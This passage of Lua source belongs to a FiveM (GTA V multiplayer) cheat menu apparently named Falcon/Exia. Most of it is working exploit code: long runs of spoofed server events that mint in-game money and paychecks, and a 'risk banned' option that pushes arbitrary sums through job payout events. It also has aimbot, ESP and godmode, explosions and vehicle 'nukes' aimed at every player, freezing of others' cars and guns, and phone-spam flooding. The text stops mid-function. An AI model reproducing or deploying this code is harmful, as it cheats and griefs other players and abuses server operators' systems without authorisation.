                        TriggerServerEvent('esx_pilot:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent('esx_taxijob:success')
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent("esx_mugging:giveMoney")
                        TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    TriggerServerEvent('paycheck:salary')
                    else
                        ShowInfo("~r~Operation Canceled")
                    end
                elseif Falcon.Button("~g~Money~s~ 3 | ~b~vRP ~r~(RISK)") then
                    local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
                    
                     if string.lower(confirm) == "y" then
                     local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                        TriggerServerEvent("esx_godirtyjob:pay", result)
                        TriggerServerEvent("esx_pizza:pay", result)
                        TriggerServerEvent("esx_slotmachine:sv:2", result)
                        TriggerServerEvent("esx_banksecurity:pay", result)
                        TriggerServerEvent("esx_gopostaljob:pay", result)
                        TriggerServerEvent("esx_truckerjob:pay", result)
                        TriggerServerEvent("esx_carthief:pay", result)
                        TriggerServerEvent("esx_garbagejob:pay", result)
                        TriggerServerEvent("esx_ranger:pay", result)
                        TriggerServerEvent("esx_truckersjob:payy", result)
                        TriggerServerEvent("esx_godirtyjob:pay", result)
                        TriggerServerEvent("dropOff",result)
                        TriggerServerEvent("PayForRepairNow",-result)
                        else
                            ShowInfo("~r~Operation Canceled")
                        end    
        elseif Falcon.Button("~r~vRP ~s~Toggle Handcuffs") then
                vRP.toggleHandcuff()
            elseif Falcon.Button("~r~vRP ~s~Clear Wanted Level") then
                vRP.applyWantedLevel(0)
            elseif Falcon.Button("~r~vRP ~s~Give Money (vrp_trucker)") then
                local money = GetKeyboardInput("Enter $ Amount:")
                local distance = money / 3.80
                vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
                vRPtruckS.finishTruckingDelivery({distance})
            elseif Falcon.Button("~r~vRP ~s~Give Casino Chips (vrp_casino)") then
				local amount = GetKeyboardInput("Enter Chips Amount:")
				vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
				vRPcasinoS.payRouletteWinnings({amount, 2})
        elseif Falcon.Button("~r~vRP ~s~Bank ~s~Deposit") then
            local money = GetKeyboardInput("Enter amount of money", "", 100)
            if money then
            TriggerServerEvent("bank:deposit", money)
            end
        elseif Falcon.Button("~r~vRP ~s~Bank ~s~Withdraw ") then
            local money = GetKeyboardInput("Enter amount of money", "", 100)
            if money then
            TriggerServerEvent("bank:withdraw", money)
            end
        elseif Falcon.Button("~r~vRP ~s~Get driving license ~r~NEW") then
            TriggerServerEvent("dmv:success")
        end
        
    elseif Falcon.IsMenuOpened('info') then
        if Falcon.Button("[~r~Exia~s~] Exia came on the market in 2019") then
    elseif Falcon.Button("[~r~JoeMoeDinHoeMoe~s~] JoeMoeDinHoeMoe is the main developer") then
    elseif Falcon.Button("[~r~Clap~s~] Clap is the second developer") then
    elseif Falcon.Button("[~r~Falcon~s~] Falcon is based on Skidmenu") then
    elseif Falcon.Button("[~r~Upcoming Website~s~] ~b~Exia.tk") then    
end

        elseif Falcon.IsMenuOpened('credits') then
        if Falcon.Button("[~r~SkidMenu~s~] For the menu base") then
    elseif Falcon.Button("[~r~WarMenu~s~] For the menu UI") then
    elseif Falcon.Button("[~r~Main dev~s~] JoeMoeDinHoeMoe#1325") then
    elseif Falcon.Button("[~r~Second dev~s~] clap#5153") then
    elseif Falcon.Button("[~r~Helper~s~] sir Flacko#1234(~r~Maestro Creator~s~)") then
    elseif Falcon.Button("[~r~Helper~s~] Nertigel#5391(~r~Dopamine Creator~s~)") then
    elseif Falcon.Button("[~r~Upcoming Website~s~] ~b~Exia.tk") then    
end


elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then
            Falcon.OpenMenu('Falcon')

        
        
        elseif IsControlJustReleased(0, Keys[noclipKeybind]) then ToggleNoclip() 

        elseif IsControlJustReleased(0, Keys[healmeckbind]) then PICKUP_HEALTH_STANDARD()    
		
		elseif IsControlJustReleased(0, Keys[teleportKeyblind]) then TeleportToWaypoint() 
		
		elseif IsControlJustReleased(0, Keys[fixvaiculoKeyblind]) then fixcar() end 

		
        Falcon.Display()
        

        if Demigod then
            if GetEntityHealth(PlayerPedId()) < 200 then
                SetEntityHealth(PlayerPedId(), 200)
            end
        end
        
        if HCocain then
            TriggerServerEvent('kokain2')
        end

        if HCocain2 then
            TriggerServerEvent('Fremstill2')
        end

        if HCocain3 then
            TriggerServerEvent('saalg2')
        end

        if Hhash then
            TriggerServerEvent('LavHash2')
        end

        if Hhash2 then
            TriggerServerEvent('FremstillHash2')
        end

        if Hhash3 then
            TriggerServerEvent('Hsaalg2')
        end

        if Hsyre then
            TriggerServerEvent('LavSyre2')
        end

        if Hsyre2 then
            TriggerServerEvent('FremstillLSD2')
        end

        if Hsyre3 then
            TriggerServerEvent('LSDsaalg2')
        end

        if HNaOH then
            TriggerServerEvent('FremstillNaOH2')
        end

        if Hvidvask then
            TriggerServerEvent('Hvidvask3')
        end


        if ADemigod then
            SetEntityHealth(PlayerPedId(), 189.9)
        end
        
        if NeverWanted then
            ClearPlayerWantedLevel(PlayerId())
        end
        
        if Noclipping then
            local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
            local k = nil
            local x, y, z = nil
            
            if not isInVehicle then
                k = PlayerPedId()
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
            else
                k = GetVehiclePedIsIn(PlayerPedId(), 0)
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
            end
            
            if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end
            
            local dx, dy, dz = GetCamDirection()
            SetEntityVisible(PlayerPedId(), 0, 0)
            SetEntityVisible(k, 0, 0)
            
            SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
            
            if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then
                oldSpeed = NoclipSpeed
                NoclipSpeed = NoclipSpeed * 2
            end
            if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then
                NoclipSpeed = oldSpeed
            end
            
            if IsDisabledControlPressed(0, 32) then
                x = x + NoclipSpeed * dx
                y = y + NoclipSpeed * dy
                z = z + NoclipSpeed * dz
            end
            
            if IsDisabledControlPressed(0, 269) then
                x = x - NoclipSpeed * dx
                y = y - NoclipSpeed * dy
                z = z - NoclipSpeed * dz
            end
			
			if IsDisabledControlPressed(0, Keys["SPACE"]) then
                z = z + NoclipSpeed
            end
            
			if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
                z = z - NoclipSpeed
            end
            
            
            SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
        end
        
        if ExplodingAll then
            ExplodeAll(includeself)
        end
        
        if freezeall then
            for i = 0, 128 do
                ClearPedTasksImmediately(GetPlayerPed(i))
            end
        end

        if Tracking then
            local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
            SetNewWaypoint(coords.x, coords.y)
        end
        
		if FlingingPlayer then
			local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
			Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
		end
        
        if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
          end

        if InfStamina then
            RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
        end

        if SuperJump then
            SetSuperJumpThisFrame(PlayerId())
        end
        
        if Invisibility then
            SetEntityVisible(PlayerPedId(), 0, 0)
        end
        
        if Forcefield then
            DoForceFieldTick(ForcefieldRadius)
        end
        
        if CarsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if GunsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedShooting(GetPlayerPed(plist[i])) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if NoisyCars then
            for k in EnumerateVehicles() do
                SetVehicleAlarmTimeLeft(k, 500)
            end
        end
        
        if FlyingCars then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
        end
        
		if Enable_GcPhone then
            for i = 0, 450 do
                FiveM.TriggerCustomEvent(false, "gcPhone:sendMessage", GetPlayerServerId(i), 5000, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', 5000, num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                end
            end

        if SuperGravity then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleGravityAmount(k, GravAmount)
            end
        end
        
        if HornBoost and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            if IsControlPressed(0, 38) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 250.0)
            end
        end

		if RainbowVeh then
            local rgb = ReturnRGB(1.0)
            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
        end
        
        if ou328hSync then
            local rgb = ReturnRGB(1.0)
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
            SetVehicleNeonLightEnabled(veh, 0, true)
            SetVehicleNeonLightEnabled(veh, 0, true)
            SetVehicleNeonLightEnabled(veh, 1, true)
            SetVehicleNeonLightEnabled(veh, 2, true)
            SetVehicleNeonLightEnabled(veh, 3, true)
            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
            SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
        end
        
        
        if ou328hNeon then
            local rgb = ReturnRGB(1.0)
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsUsing(ped)
            SetVehicleNeonLightEnabled(veh, 0, true)
            SetVehicleNeonLightEnabled(veh, 0, true)
            SetVehicleNeonLightEnabled(veh, 1, true)
            SetVehicleNeonLightEnabled(veh, 2, true)
            SetVehicleNeonLightEnabled(veh, 3, true)
            SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
        end

        if Enable_Nuke then
            Citizen.CreateThread(
                function()
          
                    local dj = 'Avenger'
                    local dk = 'CARGOPLANE'
                    local dl = 'luxor'
                    local dm = 'maverick'
                    local dn = 'blimp2'
                    while not HasModelLoaded(GetHashKey(dk)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dk))
                    end
                    while not HasModelLoaded(GetHashKey(dl)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dl))
                    end
                    while not HasModelLoaded(GetHashKey(dj)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dj))
                    end
                    while not HasModelLoaded(GetHashKey(dm)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dm))
                    end
                    while not HasModelLoaded(GetHashKey(dn)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dn))
                    end
                    for i = 0, 128 do
                        local dl =
                            CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                            CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                            CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                            CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                            CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                            CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                            CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                            CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                            CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                            CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                            CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                            CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                            CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                            CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                            CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                            AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                            AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                        end
                    end
            )
        end

        if WorldOnFire then
            local pos = GetEntityCoords(PlayerPedId())
            local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                local targetpos = GetEntityCoords(k)
                local x, y, z = table.unpack(targetpos)
                local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
            end
            

            for v in EnumeratePeds() do
                if v ~= PlayerPedId() then
                    local targetpos = GetEntityCoords(v)
                    local x, y, z = table.unpack(targetpos)
                    local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                    local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                    local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                    AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                    AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                end
            end
        end
        
        if FuckMap then
            for i = -4000.0, 8000.0, 3.14159 do
                local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
                local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
                local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)
                
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
            end
        end
        
        FiveM.toggleESP = function()

            local _,x,y = false, 0.0, 0.0
        
            Citizen.CreateThread(function()
                while visualsESPEnable do
                    local plist = GetActivePlayers()
                    if not visualsESPShowSelf then
                        table.removekey(plist, PlayerId())
                    end
                    for i = 10, #plist do
                        local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                        _, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
                    end
                    Wait(visualsESPRefreshRate)
                end
            end)

        Citizen.CreateThread(function()
            while visualsESPEnable do
                local plist = GetActivePlayers()
                if not visualsESPShowSelf then
                    table.removekey(plist, PlayerId())
                end
                for i = 1, #plist do
                    local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                    local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
                    if distance <= visualsESPDistance then
                        local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
                        local wepname = GetWeaponNameFromHash(hash)
                        local vehname = "On Foot"..'~s~ |'
                        if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
                            vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))..'~s~ |'
                        end
                        if wepname == nil then wepname = "Unknown" end
                        if visualsESPShowBox then
                            DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
                            DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
                        end
                        local espstring1 = ''
                        local espstring2 = ''
                        if visualsESPShowID then
                            espstring1 = espstring1.."~s~ | ~w~ID: ~s~" .. GetPlayerServerId(plist[i])
                        end
                        if visualsESPShowName then
                            espstring1 = espstring1.."~s~ | ~w~Name: ~s~" .. GetPlayerName(plist[i])
                        end
                        if visualsESPShowDistance then
                            espstring1 = espstring1.."~s~ | ~w~Distance: ~s~" .. math.floor(distance)..'~s~ |'
                        end
                        if visualsESPShowWeapon then
                            espstring2 = espstring2.."~s~ | ~w~Weapon: ~s~" .. wepname
                        end
                        if visualsESPShowVehicle then
                            espstring2 = espstring2.."~s~ | ~w~Vehicle: ~s~" .. vehname
                        end
                        DrawTxt(espstring1, x - 0.055, y - 0.250, 0.0, 0.25, MainColor)
                        DrawTxt(espstring2, x - 0.055, y - 0.225, 0.0, 0.25, MainColor)
    
                        if visualsESPShowLine then
                            local x1, y1, z1 = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                            local x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i)))
                            DrawLine(x1, y1, z1, x2, y2, z2, MainColor.r, MainColor.g, MainColor.b, 255)
                        end
                    end
                end
                Citizen.Wait(visualsESPRefreshRate)
            end
        end)
    
    end

        if ClearStreets then
            SetVehicleDensityMultiplierThisFrame(0.0)
            SetRandomVehicleDensityMultiplierThisFrame(0.0)
            SetParkedVehicleDensityMultiplierThisFrame(0.0)
            SetAmbientVehicleRangeMultiplierThisFrame(0.0)
            SetPedDensityMultiplierThisFrame(0.0)
        end
        
        if RapidFire then
            DoRapidFireTick()
        end
        
        if Aimbot then
            

            if DrawFov then
                DrawRect(0.25, 0.5, 0.01, 0.515, table.unpack(RGB(0.2)))
                DrawRect(0.75, 0.5, 0.01, 0.515, table.unpack(RGB(0.2)))
                DrawRect(0.5, 0.25, 0.49, 0.015, table.unpack(RGB(0.2)))
                DrawRect(0.5, 0.75, 0.49, 0.015, table.unpack(RGB(0.2)))
            end
            
            local plist = GetActivePlayers()
            for i = 1, #plist do
                ShootAimbot(GetPlayerPed(plist[i]))
            end
        
        end
        
        if Ragebot and IsDisabledControlPressed(0, Keys["MOUSE1"]) then
            for k in EnumeratePeds() do
                if k ~= PlayerPedId() then RageShoot(k) end
            end
        end
  
        SetPedCanBeKnockedOffVehicle(PlayerPedId(), Falcon.Toggle.VehicleNoFall) 

        if Crosshair then
            ShowHudComponentThisFrame(14)
        end

        if Crosshair2 then
            DrawRect(0.5, 0.5, 0.0045, 0.001, table.unpack(RGB(0.2)))
            DrawRect(0.5, 0.5, 0.001, 0.008, table.unpack(RGB(0.2)))
        end
    
        if ShowCoords then
            local pos = GetEntityCoords(PlayerPedId())
            DrawTxt("~b~X: ~w~" .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
            DrawTxt("~b~Y: ~w~" .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
            DrawTxt("~b~Z: ~w~" .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
        end
        
        if ExplosiveAmmo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
        end
        
        if ForceGun then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
